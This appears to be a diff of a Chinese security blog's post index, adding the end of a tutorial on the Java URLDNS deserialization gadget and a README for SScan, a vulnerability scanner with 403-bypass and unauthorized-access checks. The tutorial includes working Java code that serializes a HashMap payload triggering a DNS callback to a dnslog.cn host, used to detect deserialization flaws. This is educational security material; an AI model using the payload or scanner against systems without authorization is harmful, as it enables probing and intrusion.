+<p>之前在前置知识 <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">初探Java反序列化漏洞(二)</a>中讲到过反射, 上述代码就是通过反射来设置 URL 类的 hashCode的值为-1，这是因为在 HashMap#put 时，已经调用过一次hashCode() 函数，这时 hashCode的值就会改变，不再为-1，让其进行下一步执行DNS解析。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
+<p>那也就是说在下一步经过HashMap的<strong>readObject</strong>函数反序列化时, 因为此时 <code>hashCode != -1</code> ,会直接返回hashCode的值，不再进行调用 handler.hashCode(this) 。因此使用 <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> 反射将 <strong>hashCode</strong>的值设为 <strong>-1</strong>。</p>
+<p>之后通过<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> 执行序列化操作</p>
+<h2 id="0x03-代码模拟"><a href="#0x03-代码模拟" class="headerlink" title="0x03 代码模拟"></a>0x03 代码模拟</h2><p>我们来手动复原一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 put 时不发起 dns 解析</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射将put之后 hashCode 的 值重新赋值为 -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过序列化，发现确实没有在payload生成阶段发起dns解析。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
+<p>接下来我们通过读取<code>out.bin</code> 文件将其反序列化来模拟漏洞点，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">请求成功。</p>
+<p>最后回顾一下整个流程:			</p>
+<pre><code>1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器
+2. 如果目标机器存在反序列化漏洞，那么会执行`HashMap.readObject()` 将数据反序列化
+3. 在反序列化期间，为了还原hashmap的内容，会调用 `hash()` 方法，而`hash()`函数会调用传入参数的 `hashCode()`方法
+4. 当URL 对象的 `hashCode`属性值为 `-1` 时会调用 `handler.hashCode()`方法，而这个方法会进行一次DNS查询。
+</code></pre>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Jie 扫描器</title>
     <url>/2023/03/06/Jie%20%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
     <content><![CDATA[<h2 id="劫-开发中-持续更新中"><a href="#劫-开发中-持续更新中" class="headerlink" title="劫(开发中,持续更新中)"></a>劫(开发中,持续更新中)</h2><p>具体漏洞开发详情，请移步 <a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p>
@@ -850,6 +850,102 @@
 <h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a> 作者设计的我看不懂，自己重来</p>
 <p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a>	</p>
 <h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p>
+]]></content>
+      <categories>
+        <category>开源工具</category>
+      </categories>
+      <tags>
+        <tag>开源工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SScan  一款src捡洞扫描器</title>
+    <url>/2021/01/11/SScan/</url>
+    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
+<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
+<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
+<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
+<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
+<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
+
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
+<li><p><input checked="" disabled="" type="checkbox"> 
+常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+后台登录页面资产发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
+<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
+<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+一些常见未授权和弱口令检测，目前支持：</p>
+<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
+<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox"> 
+当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
+</li>
+</ul>
+<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
+<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
+<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
+<li><input disabled="" type="checkbox"> 继续优化各模块</li>
+</ul>
+<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
+<li><p>black.list 规则黑名单，命中则跳过</p>
+</li>
+<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
+</li>
+<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
+</li>
+<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
+</li>
+<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
+</li>
+<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
+</li>
+<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
+<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
+<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib&#x2F;common&#x2F;scanner.py)，可使用Scanner对象的任意方法、属性。</p>
+<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
+<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
+<p><code>self.session</code> 是HTTP连接池</p>
+<p><code>self.http_request</code> 可发起HTTP GET请求</p>
+<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
+<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
+<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
+<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
+<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
+<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
+</ul>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
+      </p>
 ]]></content>
       <categories>
         <category>开源工具</category>
@@ -959,156 +1055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SScan  一款src捡洞扫描器</title>
-    <url>/2021/01/11/SScan/</url>
-    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
-<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
-<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
-<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
-<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
-<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
-
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
-<li><p><input checked="" disabled="" type="checkbox"> 
-常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-后台登录页面资产发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
-<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
-<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-一些常见未授权和弱口令检测，目前支持：</p>
-<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
-<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
-</li>
-</ul>
-<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
-<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
-<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
-<li><input disabled="" type="checkbox"> 继续优化各模块</li>
-</ul>
-<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
-<li><p>black.list 规则黑名单，命中则跳过</p>
-</li>
-<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
-</li>
-<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
-</li>
-<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
-</li>
-<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
-</li>
-<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
-</li>
-<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
-<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
-<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
-</li>
-</ol>
-</li>
-</ul>
-<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib&#x2F;common&#x2F;scanner.py)，可使用Scanner对象的任意方法、属性。</p>
-<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
-<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
-<p><code>self.session</code> 是HTTP连接池</p>
-<p><code>self.http_request</code> 可发起HTTP GET请求</p>
-<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
-<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
-<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
-<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
-<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
-<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
-</ul>
